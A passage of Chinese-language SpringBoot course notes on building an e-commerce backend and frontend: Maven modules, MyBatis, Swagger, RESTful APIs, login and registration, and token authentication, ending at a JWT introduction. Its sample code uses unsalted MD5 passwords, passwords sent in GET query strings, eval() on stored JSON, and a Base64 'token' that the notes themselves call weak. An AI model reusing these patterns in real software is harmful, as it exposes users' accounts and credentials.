&lt;div th:fragment=\"fragment2\" style=\"width: 100%; height: 30px;background: lightgray; color:white; font-size: 16px;\"&gt; 千锋教育 武汉校区 &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 引用碎片 th:include 和 th:replace a.html &lt;!DOCTYPE html&gt; &lt;html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- &lt;div th:include=\"header::fragment1\"&gt;&lt;/div&gt;--&gt; &lt;div th:replace=\"header::fragment1\"&gt;&lt;/div&gt; &lt;div style=\"width: 100%; height: 500px\"&gt; 定义内容 &lt;/div&gt; &lt;!-- &lt;div th:include=\"footer::fragment2\"&gt;&lt;/div&gt;--&gt; &lt;div th:replace=\"footer::fragment2\"&gt;&lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 八、SpringBoot应用的热部署配置8.1 热部署项目首次部署、服务启动之后，如果应用发生了变化、而且IDEA感知到了应用的变化，就自动的完成jar的更新，无需手动再次启动服务器，就可以访问应用的更新。 8.2 热部署配置8.2.1 IDE配置（idea） File—settings Ctrl+Shift+Alt+/ —– Registry 8.2.2 SpringBoot项目配置 在需要进行热部署的SpringBoot应用中添加依赖 &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;/dependency&gt; 配置SpringBoot的Maven插件 &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;fork&gt;true&lt;/fork&gt; &lt;/configuration&gt; &lt;/plugin&gt; 配置SpringBoot应用的变化更新策略","categories":[{"name":"Java","slug":"Java","permalink":"https://bigbug888.github.io/categories/Java/"}],"tags":[{"name":"Springboot项目","slug":"Springboot项目","permalink":"https://bigbug888.github.io/tags/Springboot%E9%A1%B9%E7%9B%AE/"}]},{"title":"锋迷商城","slug":"04-锋迷商城-随堂笔记/锋迷商城","date":"2021-01-27T13:00:00.000Z","updated":"2021-11-25T19:20:51.439Z","comments":true,"path":"posts/8.html","link":"","permalink":"https://bigbug888.github.io/posts/8.html","excerpt":"","text":"一、《锋迷商城》项目介绍1.1 项目背景 锋迷商城——电商平台 B2C 商家对客户 C2B2C 客户对商家对客户 1.1.1 B2C 平台运营方即商品的卖家 小米商城 商品 用户 1.1.2 C2B2C 平台运营方不卖商品（也可以卖） 卖家是平台的用户 买家也是平台用户 用户（店铺） 用户（买家） 服务 商品 1.1.3 Java Java语言的应用领域很广，但主要应用于web领域的项目开发，web项目类型分为两类： 企业级开发 （供企业内部使用的系统：企业内部的管理系统CRM\\ERP、学校的教务管理系统） 互联网开发（提供给所有互联网用户使用的系统——用户量）—— 电商 1.2 项目功能https://www.processon.com/view/link/606bde8b1e08534321fd2103 1.3 技术选型 SSM 企业开发框架 基础的开发技术 1.3.1 单体项目 项目的页面和代码都在同一个项目，项目开发完成之后直接部署在一台服务器 单体项目遇到的问题：用户对页面静态资源以及对Java代码的访问压力都会落在Tomcat服务器上。 1.3.2 技术清单 项目架构：前后端分离 前端技术：vue、axios、妹子UI、layui、bootstrap 后端技术：SpringBoot+MyBatis、RESTful、swagger 服务器搭建：Linux、Nginx 二、项目架构的演进2.1 单体架构 前后端都部署在同一台服务器上（前后端代码都在同一个应用中） 缺点：对静态资源的访问压力也会落在Tomcat上 2.2 前后端分离 前后端分离：前端和后端分离开发和部署（前后端部署在不同的服务器） 优点：将对静态资源的访问和对接口的访问进行分离，Tomcat服务器只负责数据服务的访问 2.3 集群与负载均衡 优点：提供并发能力、可用性 2.4 分布式 基于redis实现 分布式锁 分布式数据库mycat redis集群 数据库中间件 消息中间件 2.5 微服务架构 微服务架构：将原来在一个应用中开发的多个模块进行拆分，单独开发和部署 保证可用性、性能 三、《锋迷商城》项目搭建 基于Maven的聚合工程完成项目搭建，前端采用vue+axios，后端使用SpringBoot整合SSM 3.1 技术储备 （√）SpringBoot： 实现无配置的SSM整合 （√）Maven聚合工程：实现模块的复用 3.2 创建Maven聚合工程 3.2.1 构建父工程fmmall 创建一个maven工程、packing设置为 pom 父工程继承继承spring-boot-starter-parent &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;!-- spring-boot-starter-parent --&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.4.4&lt;/version&gt; &lt;relativePath/&gt; &lt;/parent&gt; &lt;groupId&gt;com.qfedu&lt;/groupId&gt; &lt;artifactId&gt;fmmall&lt;/artifactId&gt; &lt;version&gt;2.0.1&lt;/version&gt; &lt;packaging&gt;pom&lt;/packaging&gt; &lt;/project&gt; 3.2.2 创建common工程 选择fmmall，右键—New—Module （Maven工程） 修改common的pom.xml，设置packing=jar &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;parent&gt; &lt;artifactId&gt;fmmall&lt;/artifactId&gt; &lt;groupId&gt;com.qfedu&lt;/groupId&gt; &lt;version&gt;2.0.1&lt;/version&gt; &lt;/parent&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;artifactId&gt;common&lt;/artifactId&gt; &lt;packaging&gt;jar&lt;/packaging&gt; &lt;/project&gt; 3.2.3 创建beans工程 选择fmmall，右键—New—Module （Maven工程） 修改beans的pom.xml，设置packing —– jar 3.2.4 创建mapper工程 选择fmmall，右键—New—Module （Maven工程） 修改mapper的pom.xml，设置packing —– jar 在mapper的pom.xml，依赖beans &lt;dependency&gt; &lt;groupId&gt;com.qfedu&lt;/groupId&gt; &lt;artifactId&gt;beans&lt;/artifactId&gt; &lt;version&gt;2.0.1&lt;/version&gt; &lt;/dependency&gt; 3.2.5 创建service工程 选择fmmall，右键—New—Module （Maven工程） 修改service的pom.xml，设置packing —– jar 在service的pom.xml，依赖mapper、commom &lt;dependency&gt; &lt;groupId&gt;com.qfedu&lt;/groupId&gt; &lt;artifactId&gt;mapper&lt;/artifactId&gt; &lt;version&gt;2.0.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.qfedu&lt;/groupId&gt; &lt;artifactId&gt;common&lt;/artifactId&gt; &lt;version&gt;2.0.1&lt;/version&gt; &lt;/dependency&gt; 3.2.6 创建api工程 选择fmmall，右键—New—Module （SpringBoot工程） 修改api的pom.xml，继承fmmall，删除自己的groupId 和 version &lt;parent&gt; &lt;groupId&gt;com.qfedu&lt;/groupId&gt; &lt;artifactId&gt;fmmall&lt;/artifactId&gt; &lt;version&gt;2.0.1&lt;/version&gt; &lt;/parent&gt; 将spring boot的依赖配置到父工程fmmall的pom.xml 在父工程fmmall的pom.xml的modules添加api &lt;!--fmmall pom.xml--&gt; &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.4.4&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;groupId&gt;com.qfedu&lt;/groupId&gt; &lt;artifactId&gt;fmmall&lt;/artifactId&gt; &lt;version&gt;2.0.1&lt;/version&gt; &lt;modules&gt; &lt;module&gt;common&lt;/module&gt; &lt;module&gt;beans&lt;/module&gt; &lt;module&gt;mapper&lt;/module&gt; &lt;module&gt;service&lt;/module&gt; &lt;module&gt;api&lt;/module&gt; &lt;/modules&gt; &lt;packaging&gt;pom&lt;/packaging&gt; &lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;excludes&gt; &lt;exclude&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;/exclude&gt; &lt;/excludes&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;/project&gt; 在api中，依赖service &lt;dependency&gt; &lt;groupId&gt;com.qfedu&lt;/groupId&gt; &lt;artifactId&gt;service&lt;/artifactId&gt; &lt;version&gt;2.0.1&lt;/version&gt; &lt;/dependency&gt; api的pom.xml继承fmmall 3.3 Maven聚合工程依赖分析 如果将依赖添加到父工程的pom中，根据依赖的继承关系，所有的子工程中都会继承父工程的依赖： 好处：当有多个子工程都需要相同的依赖时，无需在子工程中重复添加依赖 缺点：如果某些子工程不需要这个依赖，还是会被强行继承 如果在父工程中没有添加统一依赖，则每个子工程所需的依赖需要在子工程的pom中自行添加 如果存在多个子工程需要添加相同的依赖，则需在父工程pom进行依赖版本的管理 依赖配置说明 在父工程的pom文件中一次性添加各个子工程所需的所有依赖 在各个子工程中单独添加当前子工程的依赖 3.4 整合MyBatis3.4.1 common子工程 lombok 3.4.2 beans子工程 lombok 3.4.3 MyBatis整合 在mapper子工程的pom文件，新增mybatis所需的依赖 &lt;!--mysql--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.47&lt;/version&gt; &lt;/dependency&gt; &lt;!--spring-boot-starter--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.4.4&lt;/version&gt; &lt;/dependency&gt; &lt;!--mybatis starter--&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.1.4&lt;/version&gt; &lt;/dependency&gt; 在mapper子工程的resources目录创建application.yml spring: datasource: driver-class-name: com.mysql.jdbc.Driver url: jdbc:mysql://localhost:3306/db_2010_mybatis?characterEncoding=utf-8 username: root password: admin123 mybatis: mapper-locations: classpath:mappers/*Mapper.xml type-aliases-package: com.qfedu.fmmall.entity 在api子工程的启动类通过@MpperScan声明dao包的路径 @SpringBootApplication @MapperScan(\"com.qfedu.fmmall.dao\") public class ApiApplication { public static void main(String[] args) { SpringApplication.run(ApiApplication.class, args); } } 3.5 基于SpringBoot的单元测试3.5.1 添加依赖&lt;!--test starter--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; 3.5.2 测试类@RunWith(SpringRunner.class) @SpringBootTest(classes = ApiApplication.class) public class UserDAOTest { @Resource private UserDAO userDAO; @Test public void queryUserByName() { User user = userDAO.queryUserByName(\"Lucy\"); System.out.println(user); } } 3.6 整合Druid3.6.1 添加依赖 在mapper子工程添加druid-starter &lt;!--druid starter--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.1.22&lt;/version&gt; &lt;/dependency&gt; 3.6.2 修改数据源配置 修改mapper子工程application.yml文件 spring: datasource: druid: driver-class-name: com.mysql.jdbc.Driver url: jdbc:mysql://localhost:3306/db_2010_mybatis?characterEncoding=utf-8 username: root password: admin123 mybatis: mapper-locations: classpath:mappers/*Mapper.xml type-aliases-package: com.qfedu.fmmall.entity 四、《锋迷商城》数据库设计4.1 软件开发步骤 问题定义/提出问题 可行性分析（技术、成本、法律法规） 需求分析（需求采集、需求分析）—-&gt;甲方 概要设计 架构设计（技术选型、架构模式、项目搭建） 数据库设计 UI设计 业务流程设计 详细设计 实现步骤（业务流程的实现细节） 编码 根据设计好的实现步骤进行代码实现 开发过程中开发者要进行单元测试 测试 集成测试 功能测试（黑盒） 性能测试（白盒） 交付/部署实施 4.2 数据库设计流程 根据项目功能分析数据实体（数据实体，就是应用系统中要存储的数据对象） 商品、订单、购物车、用户、评价、地址… 提取数据实体的数据项（数据对象的属性） 商品(商品id、商品名称、商品描述，特征） 地址(姓名、地址、电话…) 使用数据库设计三范式检查数据项是否合理 分析实体关系：E-R图 数据库建模（三线图）、建模工具 建库建表-SQL 4.3 数据库设计分析4.3.1 PDMan建模工具使用 可视化创建数据表（数据表） 视图显示数据表之间的关系（关系图） 导出SQL指令（模型–导出DDL脚本） 记录数据设计的版本-数据库模型版本的管理（模型版本） 同步数据模型到数据库（开始-数据库连接） 4.3.2 分析《锋迷商城》的数据库模型 用户 首页 商品 购物车 订单 和 订单项 评论 4.4 SPU 和 SKU4.4.1 SPU SPU(Standard Product Unit)：标准化产品单元。是商品信息聚合的最小单位，是一组可复用、易检索的标准化信息的集合，该集合描述了一个产品的特性。通俗点讲，属性值、特性相同的商品就可以称为一个SPU。 1 荣耀8 2 小米10 4.4.2 SKU SKU（中文译为最小存货单位，英文全称为Stock Keeping Unit,简称SKU，定义为保存库存控制的最小可用单位) 101 8G / 128G 10 1800 1 102 4G / 128G 20 1500 1 103 8G / 128G 12 2999 2 104 12G / 256G 11 3999 2 4.5 建库建表4.5.1 创建数据表 从PDMan导出sql，导入到mysql 4.5.2 准备测试数据 首页轮播图 index_img 首页类别信息 category 商品信息 sku 五、《锋迷商城》业务流程设计-接口规范 在企业项目开发中，当完成项目的需求分析、功能分析、数据库分析与设计之后，项目组就会按照项目中的功能进行开发任务的分配 5.1 前后端分离与单体架构流程实现的区别 单体架构：页面和控制之间可以进行跳转，同步请求控制器，流程控制由的控制来完成 前后端分离架构：前端和后端分离开发和部署，前端只能通过异步向后端发送请求，后端只负责接收请求及参数、处理请求、返回处理结果，但是后端并不负责流程控制，流程控制是由前端完成 5.1.1 单体架构 5.1.2 前后端分离架构 5.2 接口介绍5.2.1 接口概念 狭义的理解：就是控制器中可以接受用户请求的某个方法 应用程序编程接口，简称API（Application Programming Interface），就是软件系统不同组成部分衔接的约定 5.2.2 接口规范 作为一个后端开发者，我们不仅要完成接口程序的开发，还要编写接口的说明文档——接口规范 接口规范示例： 参考：《锋迷商城》后端接口说明 5.3 Swagger 前后端分离开发，后端需要编写接口说明文档，会耗费比较多的时间 swagger是一个用于生成服务器接口的规范性文档、并且能够对接口进行测试的工具 5.3.1 作用 生成接口说明文档 对接口进行测试 5.3.2 Swagger整合 在api子工程添加依赖（Swagger2 \\ Swagger UI） &lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt; &lt;/dependency&gt; 在api子工程创建swagger的配置（Java配置方式） @Configuration @EnableSwagger2 public class SwaggerConfig { /*swagger会帮助我们生成接口文档 * 1：配置生成的文档信息 * 2: 配置生成规则*/ /*Docket封装接口文档信息*/ @Bean public Docket getDocket(){ //创建封面信息对象 ApiInfoBuilder apiInfoBuilder = new ApiInfoBuilder(); apiInfoBuilder.title(\"《锋迷商城》后端接口说明\") .description(\"此文档详细说明了锋迷商城项目后端接口规范....\") .version(\"v 2.0.1\") .contact( new Contact(\"亮哥\",\"www.liangge.com\",\"liangge@wang.com\") ); ApiInfo apiInfo = apiInfoBuilder.build(); Docket docket = new Docket(DocumentationType.SWAGGER_2) .apiInfo(apiInfo) //指定生成的文档中的封面信息：文档标题、版本、作者 .select() .apis(RequestHandlerSelectors.basePackage(\"com.qfedu.fmmall.controller\")) .paths(PathSelectors.any()) .build(); return docket; } } 测试： 启动SpringBoot应用，访问：http://localhost:8080/swagger-ui.html 5.3.3 Swagger注解说明 swagger提供了一套注解，可以对每个接口进行详细说明 @Api 类注解，在控制器类添加此注解，可以对控制器类进行功能说明 @Api(value = \"提供商品添加、修改、删除及查询的相关接口\",tags = \"商品管理\") @ApiOperation方法注解：说明接口方法的作用 @ApiImplicitParams和@ApiImplicitParam 方法注解，说名接口方法的参数 @ApiOperation(\"用户登录接口\") @ApiImplicitParams({ @ApiImplicitParam(dataType = \"string\",name = \"username\", value = \"用户登录账号\",required = true), @ApiImplicitParam(dataType = \"string\",name = \"password\", value = \"用户登录密码\",required = false,defaultValue = \"111111\") }) @RequestMapping(value = \"/login\",method = RequestMethod.GET) public ResultVO login(@RequestParam(\"username\") String name, @RequestParam(value = \"password\",defaultValue = \"111111\") String pwd){ return userService.checkLogin(name,pwd); } @ApiModel和@ApiModelProperty 当接口参数和返回值为对象类型时，在实体类中添加注解说明 @Data @NoArgsConstructor @AllArgsConstructor @ApiModel(value = \"User对象\",description = \"用户/买家信息\") public class User { @ApiModelProperty(dataType = \"int\",required = false) private int userId; @ApiModelProperty(dataType = \"String\",required = true, value = \"用户注册账号\") private String userName; @ApiModelProperty(dataType = \"String\",required = true, value = \"用户注册密码\") private String userPwd; @ApiModelProperty(dataType = \"String\",required = true, value = \"用户真实姓名\") private String userRealname; @ApiModelProperty(dataType = \"String\",required = true, value = \"用户头像url\") private String userImg; } @ApiIgnore接口方法注解，添加此注解的方法将不会生成到接口文档中 5.3.4 Swagger-ui 插件 导入插件的依赖 &lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;swagger-bootstrap-ui&lt;/artifactId&gt; &lt;version&gt;1.9.6&lt;/version&gt; &lt;/dependency&gt; 文档访问 http://ip:port/doc.html 5.4 RESTful 前后端分离开发的项目中，前后端之间是接口进行请求和响应，后端向前端提供请求时就要对外暴露一个URL；URL的设计不能是随意的，需要遵从一定的设计规范——RESTful RESTful 是一种Web api的标准，也就是一种url设计风格/规范 每个URL请求路径代表服务器上的唯一资源 传统的URL设计： http://localhost:8080/goods/delete?goodsId=1 商品1 http://localhost:8080/goods/delete?goodsId=2 商品2 RESTful设计： http://localhost:8080/goods/delete/1 商品1 http://localhost:8080/goods/delete/2 商品2 @RequestMapping(\"/delete/{gid}\") public ResultVO deleteGoods(@PathVariable(\"gid\") int goodsId){ System.out.println(\"-----\"+goodsId); return new ResultVO(10000,\"delete success\",null); } 使用不同的请求方式表示不同的操作 SpringMVC对RESTful风格提供了很好的支持，在我们定义一个接口的URL时，可以通过@RequestMapping(value=\"/{id}\",method=RequestMethod.GET)形式指定请求方式，也可使用特定请求方式的注解设定URL @PostMapping(\"/add\") @DeleteMapping(\"/{id}\") @PutMapping(\"/{id}\") @GetMapping(\"/{id}\") post 添加 get 查询 put 修改 delete 删除 option (预检) 根据ID删除一个商品： //http://localhost:8080/goods/1 [delete] @RequestMapping(value = \"/{id}\",method = RequestMethod.DELETE) public ResultVO deleteGoods(@PathVariable(\"id\") int goodsId){ System.out.println(\"-----\"+goodsId); return new ResultVO(10000,\"delete success\",null); } 根据ID查询一个商品： //http://localhost:8080/goods/1 [get] @RequestMapping(value = \"/{id}\",method = RequestMethod.GET) public ResultVO getGoods(@PathVariable(\"id\") int goodsId){ return null; } 接口响应的资源的表现形式采用JSON（或者XML） 在控制类或者每个接口方法添加@ResponseBody注解将返回的对象格式为json 或者直接在控制器类使用@RestController注解声明控制器 前端(Android\\ios\\pc)通过无状态的HTTP协议与后端接口进行交互 六、《锋迷商城》设计及实现—用户管理6.1 实现流程 6.2 后端接口开发6.2.1 完成DAO操作 创建实体类 @Data @NoArgsConstructor @AllArgsConstructor @ApiModel(value = \"User对象\",description = \"用户/买家信息\") public class User { private int userId; private String username; private String password; private String nickname; private String realname; private String userImg; private String userMobile; private String userEmail; private String userSex; private Date userBirth; private Date userRegtime; private Date userModtime; } 创建DAO接口、定义操作方法 public interface UserDAO { //用户注册 public int insert(User user); //根据用户名查询用户信息 public User query(String name); } 创建DAO接口的mapper文件并完成配置 &lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt; &lt;!DOCTYPE mapper PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\" \"http://mybatis.org/dtd/mybatis-3-mapper.dtd\"&gt; &lt;mapper namespace=\"com.qfedu.fmmall.dao.UserDAO\"&gt; &lt;insert id=\"insertUser\"&gt; insert into users(username,password,user_regtime,user_modtime) values(#{username},#{password},#{userRegtime},#{userModtime}) &lt;/insert&gt; &lt;resultMap id=\"userMap\" type=\"User\"&gt; &lt;id column=\"user_id\" property=\"userId\"/&gt; &lt;result column=\"username\" property=\"username\"/&gt; &lt;result column=\"password\" property=\"password\"/&gt; &lt;result column=\"nickname\" property=\"nickname\"/&gt; &lt;result column=\"realname\" property=\"realname\"/&gt; &lt;result column=\"user_img\" property=\"userImg\"/&gt; &lt;result column=\"user_mobile\" property=\"userMobile\"/&gt; &lt;result column=\"user_email\" property=\"userEmail\"/&gt; &lt;result column=\"user_sex\" property=\"userSex\"/&gt; &lt;result column=\"user_birth\" property=\"userBirth\"/&gt; &lt;result column=\"user_regtime\" property=\"userRegtime\"/&gt; &lt;result column=\"user_modtime\" property=\"userModtime\"/&gt; &lt;/resultMap&gt; &lt;select id=\"queryUserByName\" resultMap=\"userMap\"&gt; select user_id, username, password, nickname, realname, user_img, user_mobile, user_email, user_sex, user_birth, user_regtime, user_modtime from users where username=#{name} &lt;/select&gt; &lt;/mapper&gt; 6.2.2 完成Service业务 创建service接口 public interface UserService { //用户注册 public ResultVO userResgit(String name, String pwd); //用户登录 public ResultVO checkLogin(String name, String pwd); } 创建service接口实现类，完成业务实现 @Service public class UserServiceImpl implements UserService { @Autowired private UserDAO userDAO; @Transactional public ResultVO userResgit(String name, String pwd) { synchronized (this) { //1.根据用户查询，这个用户是否已经被注册 User user = userDAO.queryUserByName(name); //2.如果没有被注册则进行保存操作 if (user == null) { String md5Pwd = MD5Utils.md5(pwd); user = new User(); user.setUsername(name); user.setPassword(md5Pwd); user.setUserRegtime(new Date()); user.setUserModtime(new Date()); int i = userDAO.insertUser(user); if (i &gt; 0) { return new ResultVO(10000, \"注册成功！\", null); } else { return new ResultVO(10002, \"注册失败！\", null); } } else { return new ResultVO(10001, \"用户名已经被注册！\", null); } } } @Override public ResultVO checkLogin(String name, String pwd) { User user = userDAO.queryUserByName(name); if(user == null){ return new ResultVO(10001,\"登录失败，用户名不存在！\",null); }else{ String md5Pwd = MD5Utils.md5(pwd); if(md5Pwd.equals(user.getPassword())){ return new ResultVO(10000,\"登录成功！\",user); }else{ return new ResultVO(10001,\"登录失败，密码错误！\",null); } } } } 6.2.3 完成Controller提供接口 创建controller，调用service 添加接口注解 @RestController @RequestMapping(\"/user\") @Api(value = \"提供用户的登录和注册接口\",tags = \"用户管理\") public class UserController { @Resource private UserService userService; @ApiOperation(\"用户登录接口\") @ApiImplicitParams({ @ApiImplicitParam(dataType = \"string\",name = \"username\", value = \"用户登录账号\",required = true), @ApiImplicitParam(dataType = \"string\",name = \"password\", value = \"用户登录密码\",required = true) }) @GetMapping(\"/login\") public ResultVO login(@RequestParam(\"username\") String name, @RequestParam(value = \"password\") String pwd){ ResultVO resultVO = userService.checkLogin(name, pwd); return resultVO; } @ApiOperation(\"用户注册接口\") @ApiImplicitParams({ @ApiImplicitParam(dataType = \"string\",name = \"username\", value = \"用户注册账号\",required = true), @ApiImplicitParam(dataType = \"string\",name = \"password\", value = \"用户注册密码\",required = true) }) @PostMapping(\"/regist\") public ResultVO regist(String username,String password){ ResultVO resultVO = userService.userResgit(username, password); return resultVO; } } 6.2.4 接口测试 基于swagger进行测试 6.3 前端跨域访问6.3.1 跨域访问概念 什么时跨域访问？ AJAX 跨域访问是用户访问A网站时所产生的对B网站的跨域访问请求均提交到A网站的指定页面 6.3.2 如何解决跨域访问？ 前端使用JSONP设置 后端使用@CrossOrigin — 就是设置响应头允许跨域 6.4 前端页面之间的传值6.4.1 cookie 工具方法封装： var operator = \"=\"; function getCookieValue(keyStr){ var value = null; var s = window.document.cookie; var arr = s.split(\"; \"); for(var i=0; i&lt;arr.length; i++){ var str = arr[i]; var k = str.split(operator)[0]; var v = str.split(operator)[1]; if(k == keyStr){ value = v; break; } } return value; } function setCookieValue(key,value){ document.cookie = key+operator+value; } A页面 setCookieValue(\"username\",userInfo.username); setCookieValue(\"userimg\",userInfo.userImg); B页面 var name = getCookieValue(\"username\"); var img = getCookieValue(\"userimg\"); 6.4.2 localStorage A页面 localStorage.setItem(\"user\",JSON.stringify(userInfo)); B页面 var jsonStr = localStorage.getItem(\"user\"); var userInfo = eval(\"(\"+jsonStr+\")\"); //移出localStorage键值对 localStorage.removeItem(\"user\"); 七、前后端分离用户认证-JWT7.1 基于session实现单体项目用户认证 在单体项目中如何保证受限资源在用户未登录的情况下不允许访问？ 在单体项目中，视图资源（页面）和接口（控制器）都在同一台服务器，用户的多次请求都是基于同一个会话（session），因此可以借助session来进行用户认证判断： 1.当用户登录成功之后，将用户信息存放到session 2.当用户再次访问受限资源时，验证session中是否存在用户信息，可以根据session有无用户信息来判断用户是否登录 7.2 基于token实现前后端分离用户认证 由于在前后端分离项目开发中，前后端之间是通过异步交互完成数据访问的，请求是无状态的，因此不能基于session实现用户的认证。 7.3 基于token的用户认证的实现7.3.1 登录认证接口生成token// UserController @GetMapping(\"/login\") public ResultVO login(@RequestParam(\"username\") String name, @RequestParam(value = \"password\") String pwd){ ResultVO resultVO = userService.checkLogin(name, pwd); return resultVO; } // UserServiceImpl public ResultVO checkLogin(String name, String pwd) { Example example = new Example(Users.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(\"username\", name); List&lt;Users&gt; users = usersMapper.selectByExample(example); if(users.size() == 0){ return new ResultVO(ResStatus.NO,\"登录失败，用户名不存在！\",null); }else{ String md5Pwd = MD5Utils.md5(pwd); if(md5Pwd.equals(users.get(0).getPassword())){ //如果登录验证成功，则需要生成令牌token（token就是按照特定规则生成的字符串） String token = Base64Utils.encode(name+\"QIANfeng6666\"); return new ResultVO(ResStatus.OK,token,users.get(0)); }else{ return new ResultVO(ResStatus.NO,\"登录失败，密码错误！\",null); } } } 7.3.2 登录页面接收到token存储到cookie// login.html doSubmit:function(){ if(vm.isRight){ var url = baseUrl+\"user/login\"; axios.get(url,{ params:{ username:vm.username, password:vm.password } }).then((res)=&gt;{ var vo = res.data; if(vo.code == 10000){ //如果登录成功，就把token存储到cookie setCookieValue(\"token\",vo.msg); window.location.href = \"index.html\"; }else{ vm.tips = \"登录失败，账号或密码错误！\"; } }); }else{ vm.tips = \"请正确输入帐号和密码！\"; } } 7.3.3 购物车页面加载时访问购物车列表接口 获取token 携带token访问接口 &lt;script type=\"text/javascript\"&gt; var baseUrl = \"http://localhost:8080/\"; var vm = new Vue({ el:\"#container\", data:{ token:\"\" }, created:function(){ //当进入到购物车页面时，就要查询购物车列表（访问购物车列表接口） this.token = getCookieValue(\"token\"); console.log(\"token:\"+this.token); axios({ method:\"get\", url:baseUrl+\"shopcart/list\", params:{ token:this.token } }).then(function(res){ console.log(res); }); } }); &lt;/script&gt; 7.3.4 在购物车列表接口校验token@GetMapping(\"/list\") @ApiImplicitParam(dataType = \"string\",name = \"token\", value = \"授权令牌\",required = true) public ResultVO listCarts(String token){ //1.获取token //2.校验token if(token == null){ return new ResultVO(ResStatus.NO,\"请先登录\",null); }else{ String decode = Base64Utils.decode(token); if(decode.endsWith(\"QIANfeng6666\")){ //token校验成功 return new ResultVO(ResStatus.OK,\"success\",null); }else{ return new ResultVO(ResStatus.NO,\"登录过期，请重新登录！\",null); } } } 7.4 JWT 如果按照上述规则生成token： 1.简易的token生成规则安全性较差，如果要生成安全性很高的token对加密算法要求较高； 2.无法完成时效性的校验（登录过期） 7.4.1 JWT简介 JWT： Json Web Token 官网：https://jwt.io jwt的结构 